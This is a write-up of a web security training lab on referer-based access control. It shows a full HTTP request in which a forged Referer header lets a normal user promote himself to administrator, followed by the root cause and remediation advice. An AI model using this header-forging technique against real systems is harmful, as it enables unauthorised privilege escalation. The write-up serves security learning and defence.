# Referer-Based Access Control

## Description

This lab controls access to certain admin functionality based on the `Referer` header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

### Step 1: Test the role change endpoint as wiener

I logged in as `wiener` and sent a `POST` request to `/admin-roles` with the parameters used to upgrade a user's role, based on the pattern from the earlier admin panel labs:

```
username=wiener&action=upgrade
```

Sending this without a `Referer` header pointing to `/admin` was rejected, indicating the endpoint was checking something beyond just the session and parameters.

### Step 2: Add a forged Referer header

Since the lab title indicates the access control is based on the `Referer` header, I added a `Referer` header claiming the request originated from the admin panel page itself:

```
Referer: https://0a13002e03282c718061999e005c0034.web-security-academy.net/admin
```

Full request:

```http
POST /admin-roles HTTP/2
Host: 0a13002e03282c718061999e005c0034.web-security-academy.net
Cookie: session=sXXVCdcq1XphSUsRmSx9d5zNE3OweeBd
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a13002e03282c718061999e005c0034.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=wiener&action=upgrade
```

### Step 3: Confirm the bypass

Sending this request while authenticated as `wiener`, but with the forged `Referer` header claiming the request came from `/admin`, succeeded. Since the `Referer` header is fully controlled by the client and easily forged, the application's access control check was bypassed, and `wiener` was upgraded to administrator, solving the lab.

## Root Cause

The application enforces access control on the role-change endpoint partly by checking whether the `Referer` header matches the admin panel's URL, under the assumption that only requests genuinely originating from `/admin` would carry this value. The `Referer` header, however, is set entirely by the client and is not a reliable signal of where a request actually came from, or of the requester's authorization level. Any user can set this header to any value they choose, completely bypassing the check.

## Remediation

- Never use the `Referer` header, or any other client-controlled header, as a basis for authorization decisions.
- Enforce access control server-side based on the authenticated user's actual role or permissions, tied to their session, rather than inferring trust from where a request claims to have originated.
- Treat all HTTP headers as untrusted input unless they are set by a component the server itself fully controls.